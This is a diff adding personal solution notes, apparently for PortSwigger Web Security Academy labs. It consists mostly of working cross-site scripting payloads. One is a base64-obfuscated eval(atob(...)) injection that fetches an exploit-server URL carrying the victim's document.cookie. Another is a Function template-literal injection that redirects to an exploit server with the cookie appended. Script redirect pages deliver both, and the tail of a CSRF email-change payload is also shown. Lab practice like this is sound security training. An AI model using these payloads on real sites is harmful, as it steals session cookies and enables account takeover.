@@ -110,3 +110,32 @@ function handleResponse() {
     changeReq.send('csrf='+token+'&email=test@test.com')
 };
 </script>
+
+===========================================================================
+
+stage 1
+
+PoC:
+"+eval(atob("YWxlcnQoMSk="))}//
+
+fetch("https://exploit-0a9b009e04a8929682d05f8e015100d4.exploit-server.net/?c="+btoa(document['cookie'])) base64-ezve:
+ZmV0Y2goImh0dHBzOi8vZXhwbG9pdC0wYTliMDA5ZTA0YTg5Mjk2ODJkMDVmOGUwMTUxMDBkNC5leHBsb2l0LXNlcnZlci5uZXQvP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp
+
+"+eval(atob("ZmV0Y2goImh0dHBzOi8vZXhwbG9pdC0wYTliMDA5ZTA0YTg5Mjk2ODJkMDVmOGUwMTUxMDBkNC5leHBsb2l0LXNlcnZlci5uZXQvP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp"))}//
+
+<script>
+location = "https://0a9700a504d29218829f608d009f0069.web-security-academy.net/?SearchTerm=%22%2Beval%28atob%28%22ZmV0Y2goImh0dHBzOi8vZXhwbG9pdC0wYTliMDA5ZTA0YTg5Mjk2ODJkMDVmOGUwMTUxMDBkNC5leHBsb2l0LXNlcnZlci5uZXQvP2M9IitidG9hKGRvY3VtZW50Wydjb29raWUnXSkp%22%29%29%7D%2F%2F"
+</script>
+
+stage 1
+
+PoC: "-Function`X${a}```-"
+output: Uncaught ReferenceError: a is not defined
+
+"-Function`X${document.location="https://exploit-0a600087031e75f78385ccb001050090.exploit-server.net/aabbcc="+document.cookie}```-"
+
+url encode key chars: https://meyerweb.com/eric/tools/dencoder/
+
+<script>
+document.location = "https://0af400410395756e83d0cdfc003a001a.web-security-academy.net/?find=%22-Function`X${document.location=%22https://exploit-0a600087031e75f78385ccb001050090.exploit-server.net/aabbcc=%22%2document.cookie}```-%22"
+</script>
